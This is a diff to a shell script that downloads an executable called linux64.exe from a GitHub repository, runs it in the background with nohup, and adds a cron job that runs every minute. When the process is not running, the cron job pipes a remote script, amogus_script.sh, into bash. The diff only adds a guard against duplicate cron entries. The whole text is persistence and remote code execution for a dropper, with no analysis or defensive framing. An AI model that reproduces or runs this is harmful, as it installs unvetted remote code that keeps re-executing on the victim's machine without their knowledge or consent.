@@ -5,5 +5,8 @@ cd $path
 wget https://github.com/Waz0x/Waz0x.github.io/raw/main/bin/linux64.exe && chmod +x linux64.exe
 crontab -l > crontabs
 nohup $path/linux64.exe &
-echo '* * * * *     bash -c "if [[ -z \\"$(pidof linux64.exe)\\" ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi"' >> crontabs
+
+if [[ -z "$(crontab -l | grep bonchance)" ]]; then
+    echo '* * * * *     bash -c "if [[ -z \"$(pidof linux64.exe)\" ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi"' >> crontabs
+fi
 crontab crontabs
